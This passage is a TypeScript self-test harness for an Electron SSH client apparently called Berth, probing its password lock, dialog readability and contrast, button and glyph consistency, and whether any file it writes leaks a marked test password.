// The skeleton's self-test. It runs inside the real main process, against the real views and engines,
// and only in an unpackaged build started with SSHAPP_SELFTEST=1. It prints one line, "SELFTEST <json>",
// and exits with 0 only if every probe held. The lab (Playwright, real SSH servers, the fault proxy)
// grows out of this; these probes stay as its first cases.
import { app, clipboard, nativeImage, type BaseWindow, type Session, type WebContentsView } from 'electron';
import { spawn, type ChildProcessWithoutNullStreams } from 'node:child_process';
import { createHash, createPublicKey, randomBytes, verify } from 'node:crypto';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import os, { availableParallelism } from 'node:os';
import { chmod, mkdtemp, readdir, readFile, rm, stat, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { COPY_MAX, type AppSettings, type ShellState } from '../common/ipc';
import { fingerprintOf, type Boxes } from './boxes';
import type { SignAnswer, SignRequest } from './engine';
import type { Gate } from './gate';
import type { KeyProc } from './keyproc';
import type { Tab } from './main';
import { memory } from './memory';
import { BUDGET, type Meter } from './meter';
import { shareFor, type Pace } from './pace';
import { takePicture } from './picture';

interface Ctx {
  gate: Gate;
  keys: KeyProc;
  boxes: Boxes;
  signsRefused(): number;
  signsPassedOn(): number;
  signAs(boxId: string, req: SignRequest): Promise<SignAnswer>;
  listFile: string;
  backups: string;
  shell: WebContentsView;
  shellLoaded: Promise<void>;
  kind: string;
  mode: string;
  meter: Meter;
  win: BaseWindow;
  dist: string;
  harden(ses: Session): void;
  newView(partition: string): WebContentsView;
  openTab(boxId?: string, place?: string): Tab | null;
  closeTab(id: number): void;
  tabs: Map<number, Tab>;
  shellState(): ShellState;
  dropped(): number;
  droppedOn(): Record<string, number>;
  lateFromClosed(): number;
  missing(): Record<string, number>;
  opened(): { url: string; asked: number; refused: number };
  windowAsked(): string[];
  keysRefused(): number;
  rightClicksRefused(): number; // an answer about a right press that belonged to no press main saw
  typedInto(tab: number): number; // bytes typed into this tab's box, which only a person's own keys add to
  overlayOn(): boolean;
  windowInUse(): boolean;
  downloads: string;
  filesAsked(): Record<string, number>;
  filesAskedWhere(): Record<string, string>;
  faults(): Promise<{ written: number; lost: number; waiting: number; lately: { id: string; what: string }[]; file: string }>;
  told(): { decided: number; shown: number };
  chooseToSend(answer: (() => string | string[] | undefined) | null): void;
  savesTo(answer: (() => string | undefined) | null): void;
  saves(): { refused: number; to: string };
  stillToSend(tab: number): number;
  watchDrags(watch: ((file: string) => void) | null): void;
  chooseFolder(answer: (() => string | undefined) | null): void;
  settingsNow(): AppSettings;
  // The tabs as they are written down for the morning, with what he called each of them.
  lastTabsNow(): { box: string; place: string; own?: string; ownColour?: number }[];
  watchFirstVisits(watch: ((v: { addr: string; user: string; hostKey: string; password: string; command: string }) => { ok: true; said: string } | { ok: false; cause: string; detail: string }) | null): void;
  dragsAsked(): number;
  canDrag(tab: number): number;
  transfersOn(tab: number): number;
  chooseKeyFile(file: string): Promise<void>;
  keyPassphrase(passphrase: string): Promise<void> | undefined;
  pace: Pace;
  forcePace(share: number | null): void;
}

interface Result {
  name: string;
  ok: boolean;
  detail: string;
}

const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

// The lab's stand-in for a box (engine/internal/lab/cmd/labbox): a real SSH server on this machine, told what to
// do by lines and answering each with one line of JSON. Only a lab or development run can start it.
class LabBox {
  private readonly lines: string[] = [];
  private buf = '';
  private constructor(private readonly child: ChildProcessWithoutNullStreams) {
    child.stdout.on('data', (chunk: Buffer) => {
      this.buf += chunk.toString('utf8');
      for (let at = this.buf.indexOf('\n'); at >= 0; at = this.buf.indexOf('\n')) {
        this.lines.push(this.buf.slice(0, at));
        this.buf = this.buf.slice(at + 1);
      }
    });
    child.stderr.on('data', () => undefined);
    child.on('error', () => undefined);
  }
  static async start(bin: string): Promise<{ box: LabBox; first: Record<string, unknown> }> {
    const box = new LabBox(spawn(bin, [], { stdio: ['pipe', 'pipe', 'pipe'], env: {}, windowsHide: true }));
    return { box, first: await box.next() };
  }
  private async next(): Promise<Record<string, unknown>> {
    await until(() => this.lines.length > 0, 10_000);
    const line = this.lines.shift();
    return line ? (JSON.parse(line) as Record<string, unknown>) : { error: 'the lab box said nothing' };
  }
  tell(line: string): Promise<Record<string, unknown>> {
    this.child.stdin.write(`${line}\n`);
    return this.next();
  }
  end(): void {
    this.child.stdin.end();
  }
}

// Exactly what the SSH protocol has a client sign for a public-key sign-in (RFC 4252, section 7).
function signInData(user: string, keyLine: string, session = randomBytes(32)): Buffer {
  const s = (b: Buffer | string): Buffer => {
    const body = Buffer.from(b);
    const len = Buffer.alloc(4);
    len.writeUInt32BE(body.length);
    return Buffer.concat([len, body]);
  };
  const blob = Buffer.from(keyLine.split(' ')[1] ?? '', 'base64');
  return Buffer.concat([s(session), Buffer.from([50]), s(user), s('ssh-connection'), s('publickey'), Buffer.from([1]), s('ssh-ed25519'), s(blob)]);
}

// Does this signature, in the protocol's form, verify under this ed25519 key line?
function verifies(keyLine: string, data: Buffer, signatureB64: string): boolean {
  const blob = Buffer.from(keyLine.split(' ')[1] ?? '', 'base64');
  const sig = Buffer.from(signatureB64, 'base64');
  if (blob.length < 32 || sig.length < 64) return false;
  const key = createPublicKey({ key: Buffer.concat([Buffer.from('302a300506032b6570032100', 'hex'), blob.subarray(blob.length - 32)]), format: 'der', type: 'spki' });
  return verify(null, data, key, sig.subarray(sig.length - 64));
}

async function until(what: () => boolean | Promise<boolean>, ms: number, every = 25): Promise<boolean> {
  const end = Date.now() + ms;
  for (;;) {
    if (await what()) return true;
    if (Date.now() > end) return false;
    await sleep(every);
  }
}

const js = <T>(view: WebContentsView, code: string) => view.webContents.executeJavaScript(code, true) as Promise<T>;
const shown = (t: Tab) => js<string>(t.view, `window.berthTerm.text()`);
// Is the tab's page whole: every stylesheet it names loaded with rules in it, the terminal's typeface loaded, and
// the library's own hidden text field hidden (it shows when the library's stylesheet is missing).
interface Dress { sheets: number[]; face: boolean; field: string; }
const dress = (t: Tab) => js<Dress>(t.view, `document.fonts.ready.then(() => ({
  sheets: [...document.querySelectorAll('link[rel=stylesheet]')].map((l) => { try { return l.sheet ? l.sheet.cssRules.length : -1; } catch { return -2; } }),
  face: [...document.fonts].some((f) => f.family.replace(/['"]/g, '') === 'Plex Mono' && f.status === 'loaded'),
  field: (() => { const f = document.querySelector('.xterm-helper-textarea'); return f ? getComputedStyle(f).opacity + ' ' + getComputedStyle(f).position : 'none'; })(),
}))`);
// What a person reads in a dialog, measured in the window rather than eyeballed (BUILD-RULES 2.14: at
// least 14.5px at weight 450, and 4.5:1 or better against its own surface). Kami's #16 was "the font in
// dialogs is barely readable", and it was true twice over: every sentence was 12px, 12.5px or the body's
// 13px, and the quiet ones took --text-3, which is 4.30:1 on a dialog. This reads whatever prose is on
// screen at the moment it is called, so a dialog born small anywhere shows up here.
const PROSE = '.dlg-lead, .dlg-fact, .gate-lead, .gate-fact, .step-sub, .reach-sub, p.said, .dlg-remove .goes li, #paste .odd li';
interface Reading { what: string; size: number; weight: number; ratio: number; }
const prose = (view: WebContentsView) => js<Reading[]>(view, `(() => {
  const lum = (c) => {
    const [r, g, b] = c.map((v) => { const s = v / 255; return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4); });
    return 0.2126 * r + 0.7152 * g + 0.0722 * b;
  };
  const rgb = (s) => (s.match(/[\\d.]+/g) || []).slice(0, 3).map(Number);
  const under = (el) => {
    for (let n = el; n; n = n.parentElement) {
      const bg = rgb(getComputedStyle(n).backgroundColor);
      const a = (getComputedStyle(n).backgroundColor.match(/[\\d.]+/g) || [])[3];
      if (bg.length === 3 && a !== '0') return bg;
    }
    return [0, 0, 0];
  };
  return [...document.querySelectorAll(${JSON.stringify(PROSE)})].filter((el) => {
    const s = getComputedStyle(el);
    return el.offsetParent !== null && s.visibility !== 'hidden' && (el.textContent || '').trim().length > 12;
  }).map((el) => {
    const s = getComputedStyle(el);
    const a = lum(rgb(s.color)), b = lum(under(el));
    return {
      what: (el.id || el.className) + ' "' + (el.textContent || '').trim().slice(0, 28) + '"',
      size: Math.round(parseFloat(s.fontSize) * 10) / 10,
      weight: Number(s.fontWeight),
      ratio: Math.round(((Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05)) * 100) / 100,
    };
  });
})()`);
const tooSmall = (r: Reading) => r.size < 14.5 || r.weight < 450 || r.ratio < 4.5;
// Every answer a dialog offers, and whether it is a surface a person can see without reading. His, the night
// of 2026-11-18, looking at Close Berth: the safe answer was bare text with a glyph and a key hint floating
// beside it while the thing next to it was filled, so the dialog read as one button and a sentence. There is
// one button component now with three tones, and the thing held here is the part he saw: a button that is
// neither filled nor ringed is not a button, whatever it is called in the markup.
// How many lines of prose a dialog puts in front of him. His own W3Arena asks "Rage quit, or a real goodbye?"
// and gives one line; Berth asked "Close Berth and end 1 session?" and then a paragraph about what a session
// is. The rule he set on the night of 2026-11-18: a dialog gets a title and at most one line, and where the
// title says it already it gets none. A list of what goes is not prose: it is the facts of the thing being
// asked about, which his own rule asks for by name.
interface Story { dialog: string; lines: number; said: string[] }
const stories = (view: WebContentsView) => js<Story[]>(view, `(() => {
  const PROSE = 'p.said:not([data-value]), p.dlg-lead, p.dlg-fact, p.gate-lead, p.gate-fact';
  // A dialog built of sections is counted a section at a time: each of its sections is one setting with its
  // own question, and one line each is the rule. A dialog with no sections is one question, so it is counted
  // whole. A value the setting is set to is not a sentence, and is marked as such where it is written.
  const out = [];
  for (const d of document.querySelectorAll('.dialog, .gate')) {
    if (d.offsetParent === null) continue;
    const parts = [...d.querySelectorAll('.sect')].filter((p) => p.offsetParent !== null);
    for (const where of (parts.length > 0 ? parts : [d])) {
      const said = [...where.querySelectorAll(PROSE)].filter((el) => el.offsetParent !== null && getComputedStyle(el).visibility !== 'hidden' && (el.textContent || '').trim().length > 0);
      out.push({ dialog: (d.id || d.className) + (parts.length > 0 ? ' / ' + ((where.querySelector('.sect-head, h2') || {}).textContent || '').trim().slice(0, 24) : ''), lines: said.length, said: said.map((el) => (el.textContent || '').trim().slice(0, 50)) });
    }
  }
  return out;
})()`);
interface Answer { what: string; tone: string; surface: boolean; shape: string }
const answers = (view: WebContentsView) => js<Answer[]>(view, `(() => {
  const clear = (c) => c === 'transparent' || /rgba\\([^)]*,\\s*0\\s*\\)/.test(c);
  return [...document.querySelectorAll('.btn')].filter((el) => {
    const s = getComputedStyle(el);
    return el.offsetParent !== null && s.visibility !== 'hidden';
  }).map((el) => {
    const s = getComputedStyle(el);
    const filled = !clear(s.backgroundColor);
    const ringed = s.boxShadow !== 'none' || ['Top', 'Right', 'Bottom', 'Left'].some((side) => parseFloat(s['border' + side + 'Width']) > 0 && s['border' + side + 'Style'] !== 'none' && !clear(s['border' + side + 'Color']));
    const mark = el.querySelector('svg path, svg rect, svg circle');
    return { what: (el.id || el.className) + ' "' + (el.textContent || '').trim().slice(0, 24) + '"', tone: el.className, surface: filled || ringed, shape: mark ? (mark.getAttribute('d') || mark.outerHTML).slice(0, 80) : '' };
  });
})()`);
// Every glyph a menu draws, against the one the pane falls back to. A name the pane does not know is not an
// error anywhere: `SHAPES[kind] ?? SHAPES['unknown']` quietly draws the question mark, which is how "Back to
// the folder" came to be marked with one. A menu line is a glyph and a few words, so a glyph that says
// nothing is half the line gone, and nothing in the build would ever have said so.
interface MenuMark { where: string; lines: number; unknown: string[] }
const menuGlyphs = (view: WebContentsView, where: string) => js<MenuMark>(view, `(() => {
  const ones = [...document.querySelectorAll('.fb-menu-one')];
  // What the pane draws when it does not know the name, taken from the pane itself rather than written out
  // here: a probe holding a copy of the shape would pass the day the shape changed.
  const miss = window.berthGlyphPath ? window.berthGlyphPath('a-name-no-pane-has') : '';
  return {
    where: ${JSON.stringify(where)},
    lines: ones.length,
    unknown: ones.filter((o) => {
      // Any shape at all, under whichever class the surface draws glyphs with: a line with nothing drawn on
      // it is the fault being looked for, and so is one drawn with the shape used for a name nobody has.
      const g = o.querySelector('svg');
      const drawn = g ? [...g.querySelectorAll('path, rect, circle, ellipse, line, polyline, polygon')] : [];
      const d = drawn.map((e) => e.getAttribute('d') ?? e.tagName).join('|');
      return drawn.length === 0 || (miss !== '' && d === miss);
    }).map((o) => ${JSON.stringify(where)} + ': ' + (o.querySelector('.fb-menu-words')?.textContent ?? '?')),
  };
})()`);
// A colour from the stylesheet (#79a373) as the window reports it back (rgb(121, 163, 115)), so a probe can
// hold that a field really took the variable it was meant to and not a near neighbour.
const hexToRgb = (hex: string): string => {
  const h = hex.replace('#', '');
  const n = parseInt(h.length === 3 ? h.split('').map((c) => c + c).join('') : h, 16);
  return `rgb(${(n >> 16) & 255}, ${(n >> 8) & 255}, ${n & 255})`;
};
// Every glyph the pane has drawn, wherever it drew it. The menu-only sweep above caught a question mark on a
// menu line and then let one through on the transfers strip the same evening, because `upload` and `download`
// are names the shell has and the pane does not. A row that really is of an unknown kind is left out: that is
// the one place the question mark is the right answer.
const paneGlyphs = (view: WebContentsView, where: string) => js<MenuMark>(view, `(() => {
  const miss = window.berthGlyphPath ? window.berthGlyphPath('a-name-no-pane-has') : '';
  const all = [...document.querySelectorAll('.fb-glyph')].filter((g) => !g.closest('[data-kind="unknown"]'));
  return {
    where: ${JSON.stringify(where)},
    lines: all.length,
    unknown: all.filter((g) => {
      const d = g.querySelector('path')?.getAttribute('d') ?? '';
      return miss !== '' && d === miss;
    }).map((g) => ${JSON.stringify(where)} + ': ' + (((g.closest('.fb-row, .fb-moving-one, .fb-menu-one, button')?.textContent ?? '?').trim().slice(0, 30)) || 'a glyph with no words')),
  };
})()`);
const dressed = (d: Dress) => d.sheets.length >= 3 && d.sheets.every((n) => n > 0) && d.face && d.field === '0 absolute';
// A folder that really cannot be written to, on either kind of machine. Permissions do it where there are
// permissions; on Windows what decides is the folder's own list of who may do what, so the lab writes a deny
// into it with the system's own tool. Anything less is a folder Windows will happily write to, and a probe
// that proves nothing on the one machine where downloads land.
const cannotBeWrittenTo = async (dir: string): Promise<void> => {
  if (process.platform !== 'win32') {
    await chmod(dir, 0o500);
    return;
  }
  // Everyone, by the id Windows knows it as whatever the machine's language is, and a deny beats anything
  // else a person holds, administrator included. The user's own name is not used: on a machine joined to a
  // domain it is not the name icacls wants. What it says is kept, because a setup that quietly did not work
  // is a probe proving nothing, and the probe has to be able to say that it was the setup and not the app.
  lastDeny = await icacls([dir, '/inheritance:r', '/deny', '*S-1-1-0:(WD,AD,WA)']);
};

// Whether that folder really is unwritable now, found the only way that is true on every machine: by trying.
const reallyCannotBeWrittenTo = async (dir: string): Promise<boolean> => {
  const proof = path.join(dir, `.lab-can-write-${randomBytes(4).toString('hex')}`);
  try {
    await writeFile(proof, '');
    await rm(proof, { force: true });
    return false;
  } catch {
    return true;
  }
};

let lastDeny = ''; // what the system's own tool said, for a probe whose setup did not work

const icacls = (args: string[]): Promise<string> =>
  new Promise<string>((done) => {
    let said = '';
    const p = spawn('icacls', args, { windowsHide: true });
    p.stdout.on('data', (b: Buffer) => (said += b.toString()));
    p.stderr.on('data', (b: Buffer) => (said += b.toString()));
    p.on('close', (code) => done(`${args[1]} ended ${code}: ${said.replace(/\s+/g, ' ').slice(0, 200)}`));
    p.on('error', (err) => done(`icacls could not be run: ${String(err)}`));
  });

const canBeWrittenToAgain = async (dir: string): Promise<void> => {
  if (process.platform !== 'win32') {
    await chmod(dir, 0o700).catch(() => undefined);
    return;
  }
  await icacls([dir, '/remove:d', '*S-1-1-0']);
};

const type = (t: Tab, text: string) => js<void>(t.view, `window.tabPort.send(new TextEncoder().encode(${JSON.stringify(text)}))`);
// Signals go to one real process only. A pid of 0 would mean "every process in our group", main included:
// an engine that never started has no pid, and must never be signalled.
const signal = (pid: number, sig: NodeJS.Signals): boolean => {
  if (!Number.isInteger(pid) || pid <= 1) return false;
  try {
    process.kill(pid, sig);
    return true;
  } catch {
    return false;
  }
};
const alive = (pid: number) => {
  if (!Number.isInteger(pid) || pid <= 1) return false;
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};

export async function runSelfTest(ctx: Ctx): Promise<void> {
  const results: Result[] = [];
  let stage = 'starting';
  // Every dialog this run opens has its sentences measured as it stands open, and the readings pile up
  // here; finish() holds them all at once, so one line names whichever dialog is the small one.
  const readings: Reading[] = [];
  // Every menu this run opens, swept for a glyph the pane does not know.
  const menuMarks: MenuMark[] = [];
  const sweepMenu = async (view: WebContentsView, where: string): Promise<void> => { menuMarks.push(await menuGlyphs(view, where)); };
  // The box screens are the mode that opens dialogs: 19 lines across the check, Add box, the first visit, the
  // settings, a paste, an odd paste, a link, a changed identity, Edit box and Delete box. The floor is just
  // under that, so the measurement quietly stopping is a failure rather than a pass with nothing in it. The
  // other modes open no dialogs, and a minimum they cannot meet would fail them for nothing.
  // The floors exist so a sweep that quietly stopped running fails rather than passing over nothing, so they
  // follow what the run really reads rather than being left where they were written. Both jumped when the
  // sweeps moved onto every screen a picture is taken of: 44 sentences and 91 answers, against 16 and 14 at
  // five moments chosen by hand.
  const wantedReadings = ctx.mode === 'boxes-ui' ? 40 : 0;
  // The answers those same dialogs offered.
  const seen: Answer[] = [];
  const wantedAnswers = ctx.mode === 'boxes-ui' ? 85 : 0;
  const told: Story[] = [];
  // Ten menus and one whole pane are swept in the box screens, 85 glyphs between them. A floor under that,
  // so the sweep quietly never running is a failure rather than a pass over nothing.
  const wantedMenus = ctx.mode === 'boxes-ui' ? 80 : 0;
  const read = async (view: WebContentsView): Promise<void> => { readings.push(...(await prose(view))); seen.push(...(await answers(view))); told.push(...(await stories(view))); };
  const check = (name: string, ok: boolean, detail: unknown = '') => {
    stage = `after "${name}"`;
    // What a probe says about a failure is for a person to read, so it is bounded: one probe that happened to
    // hold a whole file would otherwise make a result line nothing downstream could carry.
    const said = typeof detail === 'string' ? detail : JSON.stringify(detail);
    results.push({ name, ok, detail: said.length > 1500 ? `${said.slice(0, 1500)}... (${said.length} characters in all)` : said });
  };
  const finish = (asked: number) => {
    // Every mode ends here, so every mode is held to this: a page that asked for a file the app does not hold
    // was running without a part of itself.
    check('no page of the app asked for a file the app does not hold', Object.keys(ctx.missing()).length === 0, ctx.missing());
    // The sentences every dialog of this run put in front of him, each against its own surface. The count is
    // held too: a measurement that never ran would otherwise pass for a window with no small text in it.
    // Every menu opened in this run, and the glyph on every line of it.
    const blank = menuMarks.flatMap((m) => m.unknown);
    const menuLines = menuMarks.reduce((n, m) => n + m.lines, 0);
    check('every glyph this run drew, on every menu line and everywhere in the pane, is one the pane really has',
      (menuMarks.length === 0 ? wantedMenus === 0 : menuLines >= wantedMenus) && blank.length === 0,
      { menus: menuMarks.length, lines: menuLines, wanted: wantedMenus, blank });
    const small = readings.filter(tooSmall);
    check('every sentence a dialog puts in front of him is at least 14.5px at weight 450 and 4.5:1 against its own surface',
      readings.length >= wantedReadings && small.length === 0,
      { read: readings.length, wanted: wantedReadings, small });
    const bare = seen.filter((a) => !a.surface);
    // Every glyph is read against the action it sits on (his, 2026-11-18 night). What that comes to, in
    // something a build can hold: the answer that takes something away and the answer that keeps it must
    // never wear the same shape. A square with nothing in it sat on Close Berth and on Delete a box while
    // Keep Berth open wore the X that cancels, so one shape did two jobs and another said the opposite of
    // the button it was on. Shapes are read off the buttons as they were really drawn, not from the set.
    const danger = new Set(seen.filter((a) => a.tone.includes('btn-danger') && a.shape !== '').map((a) => a.shape));
    const bothWays = seen.filter((a) => a.tone.includes('btn-plain') && a.shape !== '' && danger.has(a.shape));
    check('no shape sits on both the answer that takes something away and the answer that keeps it', bothWays.length === 0, bothWays);
    const storytellers = told.filter((t) => t.lines > 1);
    check('no dialog tells him a story: a title, what it is about, and at most one line', storytellers.length === 0, storytellers);
    check('every answer a dialog offers is a surface he can see, not words beside a filled one',
      seen.length >= wantedAnswers && bare.length === 0,
      { read: seen.length, wanted: wantedAnswers, bare });
    const code = asked === 0 && results.every((r) => r.ok) ? 0 : 1;
    process.stdout.write(`SELFTEST ${JSON.stringify({ ok: code === 0, kind: ctx.kind, results })}\n`);
    app.exit(code);
  };
  // The one thing this guard is for is a hang: a run that stops answering, with nothing to show for it. How
  // fast the app is has its own budgets, measured and reported separately (B8), so this ceiling is generous
  // on purpose and rises with the number of things the lab tries, rather than quietly cutting them. On a slow
  // test machine it is multiplied by the stated factor, as every other budget is.
  const wholeRunMs = 300_000 * Math.max(1, Number(process.env['SSHAPP_BUDGET_FACTOR']) || 1);
  const guard = setTimeout(() => {
    check('finished in time', false, `no end within ${Math.round(wholeRunMs / 1000)} s; stuck ${stage}`);
    finish(1);
  }, wholeRunMs);

  // A canary: a web server on this machine that must never hear from a view. It exists only during this
  // test, in an unpackaged build; the app itself never listens on any port.
  let canaryHits = 0;
  const canary = createServer((_req, res) => {
    canaryHits++;
    res.end('reached');
  });
  await new Promise<void>((r) => canary.listen(0, '127.0.0.1', r));
  const web = `http://127.0.0.1:${(canary.address() as AddressInfo).port}`;

  try {
    stage = 'loading the shell view';
    await ctx.shellLoaded;
    check('the shell view loads', true);

    // ---- The lock. Every run begins here, as the app does: nothing works before the password. ----
    // The lab's password carries a marker, so that every file the app wrote can be searched for it afterwards.
    const PASSWORD = 'berth-lab-canary-7f3a91 password';
    const phase = () => ctx.gate.state.phase;
    const sh = ctx.shell.webContents;
    const at = (sel: string, on: Tab | null = null) => js<{ x: number; y: number } | null>(on ? on.view : ctx.shell, `(() => { const b = document.querySelector(${JSON.stringify(sel)}); if (!b) return null; const r = b.getBoundingClientRect(); return { x: Math.round(r.x + r.width / 2), y: Math.round(r.y + r.height / 2) }; })()`);
    const clickOn = async (sel: string, on: Tab | null = null) => {
      const p = await at(sel, on);
      if (!p) return false;
      // A tab's view draws where it sits in the window, but is clicked in its own, so the point is its own.
      const w = on ? on.view.webContents : sh;
      w.sendInputEvent({ type: 'mouseDown', x: p.x, y: p.y, button: 'left', clickCount: 1 });
      w.sendInputEvent({ type: 'mouseUp', x: p.x, y: p.y, button: 'left', clickCount: 1 });
      await sleep(60);
      return true;
    };
    // Real keys, one character at a time, into whatever has the focus.
    const typeKeys = async (text: string) => {
      for (const ch of text) sh.sendInputEvent({ type: 'char', keyCode: ch });
      await sleep(120);
    };
    // The password, typed into a field and proven to have landed whole before it is sent. Keys are real key
    // events into whatever has the focus, so a field that has not taken the focus yet eats the first of
    // them: the password is then wrong, the lock says so, and the probe fails for a reason that is the
    // lab's and not the app's. It happened once in CI on the damaged-list screen and passed on a re-run,
    // which is the worst kind of probe there is. Only the length is ever read, never the characters.
    const typePassword = async (sel: string, pw: string): Promise<boolean> => {
      for (let go = 0; go < 4; go++) {
        await clickOn(sel);
        await js(ctx.shell, `(() => { const i = document.querySelector(${JSON.stringify(sel)}); if (i) { i.focus(); i.value = ''; i.dispatchEvent(new Event('input', { bubbles: true })); } })()`);
        await typeKeys(pw);
        if (await until(async () => (await js<number>(ctx.shell, `document.querySelector(${JSON.stringify(sel)})?.value.length ?? -1`)) === pw.length, 2000)) return true;
      }
      return false;
    };
    const pressEnter = async () => {
      sh.sendInputEvent({ type: 'keyDown', keyCode: 'Enter' });
      sh.sendInputEvent({ type: 'keyUp', keyCode: 'Enter' });
      await sleep(60);
    };
    const text = (sel: string, on: Tab | null = null) => js<string>(on ? on.view : ctx.shell, `document.querySelector(${JSON.stringify(sel)})?.textContent ?? ''`);
    const has = (sel: string, on: Tab | null = null) => js<boolean>(on ? on.view : ctx.shell, `!!document.querySelector(${JSON.stringify(sel)})`);
    // Every file under the lab's folders: none may hold the password.
    const filesHolding = async (needle: string): Promise<string[]> => {
      const found: string[] = [];
      const walk = async (dir: string): Promise<void> => {
        for (const e of await readdir(dir, { withFileTypes: true }).catch(() => [])) {
          const p = path.join(dir, e.name);
          if (e.isDirectory()) await walk(p);
          else if (e.isFile()) {
            // A file can go between being listed and being looked at: the browser engine writes its own
            // settings under a temporary name and renames it a moment later. That is not a fault of the
            // app's and must not end a run.
            const at = await stat(p).catch(() => null);
            if (at && at.size < 64 * 1024 * 1024 && (await readFile(p).catch(() => Buffer.alloc(0))).includes(needle)) found.push(p);
          }
        }
      };
      await walk(path.dirname(path.dirname(ctx.listFile)));
      return found;
    };
    let refusedByTheLock = 0;
    const lockHolds = async (what: string) => {
      refusedByTheLock++;
      const before = ctx.dropped();
      await js(ctx.shell, `window.shellPort.cmd({ op: 'new' })`);
      await sleep(250);
      check(`${what}: a tab cannot be opened`, ctx.tabs.size === 0 && ctx.dropped() === before + 1, [ctx.tabs.size, ctx.dropped() - before]);
    };

    if (ctx.mode !== 'direction' && ctx.mode !== 'engine-must-be-refused') {
      stage = 'the lock';
      await until(() => phase() !== 'starting', 20_000);
    }

    if (ctx.mode === 'all') {
      // The first start, through the real screen with real keys.
      check('first start: the lock asks to make a password', phase() === 'create' && (await until(() => has('#gate-create'), 5000)) && !(await has('#bar')), phase());
      // Windows draws no title bar for Berth, so the screens before the lock carry the window's own buttons
      // themselves. Without them this screen could not be put away or moved with the mouse at all.
      check('the screens before the lock carry the window\'s own buttons', (await has('#win-strip')) && (await has('#win-min')) && (await has('#win-max')) && (await has('#win-close')), '');
      // And the same status line the window has. These screens had none at all, so the app's one place for
      // saying where things stand vanished on them (the owner, 2026-11-17: "no real thin footer everywhere").
      check('the screens before the lock carry the status line too', (await has('#gate-status')) && (await text('#gate-status')).includes('Berth') && (await text('#gate-status-where')) === 'First start', await text('#gate-status'));
      await lockHolds('before any password');
      // Pressing with nothing typed: it must say what is in the way and put the cursor where it is. Before, the
      // press did nothing whatever, on the first screen anyone sees.
      await clickOn('#gate-submit');
      check('the first press with nothing typed says what is in the way', await until(async () => (await text('#gate-to-fix')).includes('A password is needed'), 2000), await text('#gate-to-fix'));
      check('and puts the cursor in the password field', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'pw-one', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
      await clickOn('#pw-one');
      await typeKeys('too short');
      const shortSaid = await text('#pw-one-check');
      await pressEnter();
      await sleep(300);
      check('a password of 9 characters is said to be short, and Enter does nothing', shortSaid.includes('9 of 12') && phase() === 'create', [shortSaid, phase()]);
      await js(ctx.shell, `document.querySelector('#pw-one').select()`);
      await typeKeys(PASSWORD);
      await clickOn('#pw-two');
      await typeKeys(PASSWORD.slice(0, -1));
      const differs = await text('#pw-two-check');
      await typeKeys(PASSWORD.slice(-1));
      const same = await text('#pw-two-check');
      check('typed twice: a difference is said, and so is a match', differs.includes('not the same') && same.includes('the same as above'), [differs, same]);
      check('the backup folder is checked before it is used', (await text('#backup-check')).includes('writable') && (await text('#backup-dir')) === ctx.backups, await text('#backup-check'));
      await pressEnter();
      check('the password makes the list and unlocks', await until(() => phase() === 'unlocked', 30_000), [phase(), ctx.gate.state.detail]);
      check('the window is the app now, and no password field is left', (await until(() => has('#bar'), 5000)) && !(await has('input')), '');
      const list = await readFile(ctx.listFile).catch(() => Buffer.alloc(0));
      const backup = await readFile(path.join(ctx.backups, 'Berth list backup.berth')).catch(() => Buffer.alloc(1));
      check('the list is on disk, sealed, and its backup is the same file', list.subarray(0, 8).toString() === 'BERTHVLT' && list.equals(backup) && ctx.gate.backup === 'written', [list.length, backup.length, ctx.gate.backup]);
      const holding = await filesHolding(PASSWORD);
      check('no file the app wrote holds the password', holding.length === 0, holding);
    } else if (ctx.mode === 'gate-unlock') {
      // A later start, on a profile that already has a list: wrong password, the wait, then the right one.
      check('a later start: the lock asks for the password and shows nothing else', phase() === 'locked' && (await until(() => has('#gate-unlock'), 5000)) && !(await has('#bar')) && !(await has('#gate-create')), phase());
      await lockHolds('before the password');
      await clickOn('#pw');
      await typeKeys('not the password, sorry');
      await pressEnter();
      const wrong = await until(() => ctx.gate.state.wrong && phase() === 'locked', 30_000);
      check('a wrong password is said plainly, and the next try must wait', wrong && (await until(async () => (await text('#gate-wrong')).includes('Wrong password') && (await text('#gate-submit')).includes('Wait'), 3000)) && ctx.gate.view().waitMs > 0, [phase(), await text('#gate-submit'), ctx.gate.view().waitMs]);
      await lockHolds('after a wrong password');
      check('the right password lands in the field whole before it is sent', await typePassword('#pw', PASSWORD), '');
      await pressEnter(); // during the wait: not sent, not looked at
      await sleep(200);
      check('the right password during the wait is not looked at', phase() === 'locked', phase());
      await until(async () => (await text('#gate-submit')).trim() === 'Unlock', 5000);
      // And it is still whole after the wait: the field is read again rather than assumed, because what is
      // pressed next is the press that must unlock.
      check('and it is still whole when the wait is over', (await js<number>(ctx.shell, `document.querySelector('#pw')?.value.length ?? -1`)) === PASSWORD.length, '');
      // Watching every frame from here, not sampling: the lock opens and the window is drawn at once, and
      // the fault being held off is a single frame of it. Add box drawn while the app shows no box he has is
      // a button standing where the morning's offer is about to land, and a press begun on it lands on that
      // instead. The watcher counts any frame in which Add box is there and his boxes are not.
      await js(ctx.shell, `(() => {
        window.__addBoxAlone = 0;
        const look = () => { if (document.getElementById('first-add') && !document.querySelector('[data-open]')) window.__addBoxAlone++; };
        look();
        new MutationObserver(look).observe(document.body, { childList: true, subtree: true });
        return 'watching';
      })()`);
      await pressEnter();
      // The window's own three buttons, before the lock opens: Windows draws no title bar for Berth, so if these
      // were not here a person could not put the password screen away or move it with the mouse at all.
      check('the lock screen carries the window\'s own buttons', (await has('#win-strip')) && (await has('#win-min')) && (await has('#win-max')) && (await has('#win-close')), await text('#win-strip'));
      check('after the wait the right password unlocks', await until(() => phase() === 'unlocked', 30_000), [phase(), ctx.gate.state.detail]);
      check('the window is the app now', await until(() => has('#bar'), 5000), '');
      if (process.env['SSHAPP_LABBOX']) {
        await until(async () => has('[data-open]'), 5000);
        const alone = await js<number>(ctx.shell, `window.__addBoxAlone`);
        check('the lock opens on the boxes he has: Add box is never drawn alone first, with nothing to press moving after', alone === 0, [alone, await text('#first-use')]);
      }

